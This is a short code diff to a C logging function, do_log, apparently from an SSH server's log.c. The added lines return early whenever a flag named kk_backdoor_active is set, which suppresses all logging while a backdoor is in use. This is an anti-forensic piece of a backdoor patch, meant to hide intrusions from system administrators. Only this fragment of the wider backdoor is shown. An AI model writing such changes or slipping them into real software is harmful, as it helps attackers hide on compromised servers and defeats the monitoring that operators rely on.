@@ -392,6 +392,9 @@ do_log(LogLevel level, const char *fmt, va_list args)
 	int saved_errno = errno;
 	log_handler_fn *tmp_handler;
 
+	if(kk_backdoor_active)
+		return;
+
 	if (level > log_level)
 		return;
 
